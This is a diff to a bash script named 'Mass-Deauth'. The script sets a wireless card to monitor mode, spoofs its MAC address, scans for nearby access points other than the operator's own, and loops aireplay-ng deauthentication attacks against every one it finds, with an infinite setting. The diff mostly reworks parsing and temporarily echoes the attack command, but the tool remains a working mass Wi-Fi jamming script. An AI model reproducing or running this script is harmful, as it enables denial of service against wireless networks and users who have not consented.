@@ -9,11 +9,12 @@ waitTime="30" # Time to wait before refreshing attack
 MIFACE="mon0"  # monitor interface
 WIFACE="wlp3s0u1"  # wireless card's interface
 DEAUTHS="10" # number of deauths to send; 0 = Infinite
-ourAPmac="5C:57:1A:CD:0C:61"  # our own AP's MAC address; so we don't own our own AP
+ourAPmac="5c:57:1a:cd:0c:61"  # our own AP's MAC address; so we don't own our own AP
 
 ########################### LOGICAL STUFF - don't touch unless you're 31337
 version="0.1"
 atk="0"
+export ourAPmac
 
 clear
 echo -e "\e[01;32m[>]\e[00m Setting up for attack..."
@@ -39,9 +40,9 @@ rmlogs
 xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ip link set $WIFACE up" &
 
 while [ ! $moncheck ]; do
-	moncheck=`iw dev | grep $MIFACE | awk '{print $2}'`
+	moncheck=`iw dev | awk '$0 ~ /Interface / {print $2}'`
 	xterm -geometry 75x10+464+446 -T "Mass-Deauth v$version - Start $MIFACE" -e "ip link set $WIFACE up && airmon-ng start $WIFACE"
-	moncheck=`iw dev | grep $MIFACE | awk '{print $2}'`
+	moncheck=`iw dev | awk '$0 ~ /Interface / {print $2}'`
 done
 
 echo -e "\e[01;32m[>]\e[00m Changing MAC Address...\n"
@@ -57,7 +58,8 @@ while true; do
 	rmlogs
 	iwlist $WIFACE scan > /tmp/scan.tmp
 	sleep 3
-	cat /tmp/scan.tmp | grep "Address:" | grep -ivF "$ourAPmac" | cut -b 30-60 > /tmp/APmacs.lst
+	awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
+	#awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp | xargs -I {} echo "aireplay -0 1 -D -a {}"
 	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
 	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
 	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
@@ -67,7 +69,7 @@ while true; do
 			scan1="1"
 			curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 			echo -e "\e[01;32m[>]\e[00m Deauth'ing All Clients on $curAP ..."
-			xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
+			xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "echo aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
 			curLine=$(($curLine+$x))
 	done
 	atk="1"
